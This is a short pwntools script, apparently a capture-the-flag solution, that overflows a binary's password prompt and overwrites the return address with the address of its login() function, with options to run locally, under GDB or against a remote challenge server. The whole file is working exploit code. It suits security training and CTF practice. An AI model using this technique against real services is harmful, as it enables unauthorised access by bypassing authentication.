#!/usr/bin/env python3
from pwn import *

context.update(arch="amd64", timeout=1)

exe = ELF("./bin")
if args.GDB:  # debug: local exploit with tmux/gef
    context.terminal = ["tmux", "splitw", "-h"]
    p = gdb.debug(
        "./bin",
        """
    source /home/user/.gdbinit-gef.py
    break *(main+42)
    continue
    """,
    )
elif args.LOCAL:  # exploit locally
    p = process("./bin")
else:  # exploit online
    p = remote("cytech.tcdn.casa", 4101)

# on reecrit l'addresse de retour avec celle de login():
log.info("Payload:")
payload = flat(
    {
        "saaa": exe.sym["login"],
    }
)
log.hexdump(payload)
p.sendlineafter(b"mot de passe:\n", payload)
p.interactive()
